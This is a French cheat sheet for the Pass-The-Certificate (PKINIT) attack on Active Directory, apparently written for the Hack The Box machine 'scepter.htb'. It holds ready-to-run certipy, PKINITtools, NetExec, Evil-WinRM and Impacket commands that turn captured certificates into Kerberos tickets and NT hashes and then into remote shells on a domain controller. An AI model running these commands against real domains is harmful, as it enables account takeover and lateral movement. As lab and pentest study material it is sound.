# Pass-The-Certificate (PKINIT)

***

### <mark style="color:red;">Pass-The-Certificate (PKINIT)</mark>

#### 📖 Concept

PKINIT permet l'authentification Kerberos via certificat au lieu de mot de passe. C'est l'équivalent de Pass-The-Hash mais avec des certificats.

#### 🔧 Outils

* `certipy` : Outil tout-en-un pour AD CS
* `gettgtpkinit.py` (PKINITtools) : Alternative
* `evil-winrm` : Connexion WinRM avec Kerberos

#### ⚙️ Prérequis

```bash
# Synchroniser l'horloge (CRITIQUE)
sudo ntpdate <DC_IP>

# Configuration Kerberos
cat > /tmp/krb5.conf <<EOF
[libdefaults]
    default_realm = SCEPTER.HTB
    dns_lookup_realm = true
    dns_lookup_kdc = true

[realms]
    SCEPTER.HTB = {
        kdc = dc01.scepter.htb
        admin_server = dc01.scepter.htb
    }

[domain_realm]
    .scepter.htb = SCEPTER.HTB
    scepter.htb = SCEPTER.HTB
EOF

export KRB5_CONFIG=/tmp/krb5.conf
```

#### 💣 Exploitation

**Méthode 1 : Certipy (Recommandé)**

```bash
# Authentification avec certificat
certipy auth -pfx baker.pfx -dc-ip <DC_IP> -domain scepter.htb

# Sortie attendue
# [*] Got TGT
# [*] Saved credential cache to 'd.baker.ccache'
# [*] Got hash for 'd.baker@scepter.htb': aad3b...:18b5fb...
```

**Méthode 2 : PKINITtools**

```bash
# Obtenir un TGT
gettgtpkinit.py -pfx-pass newpassword -cert-pfx scott.pfx \
    scepter.htb/o.scott o.scott.ccache
```

#### 🔑 Utilisation du TGT

**Avec NetExec**

```bash
export KRB5CCNAME=d.baker.ccache
netexec smb scepter.htb -k --use-kcache
```

**Avec Evil-WinRM**

```bash
export KRB5CCNAME=d.baker.ccache
evil-winrm -i dc01.scepter.htb -r SCEPTER.HTB
```

**Avec Impacket**

```bash
export KRB5CCNAME=d.baker.ccache
impacket-getTGT -dc-ip <DC_IP> -hashes :HASH 'scepter.htb/d.baker'
```

#### ⚠️ Erreurs courantes

**KRB\_AP\_ERR\_SKEW (Clock skew)**

```bash
# Solution
sudo ntpdate <DC_IP>
```

**KDC\_ERR\_CLIENT\_REVOKED**

```bash
# Le compte est désactivé ou révoqué
# Vérifier avec:
netexec ldap <DC_IP> -u username -p password --query "(sAMAccountName=username)"
```

***
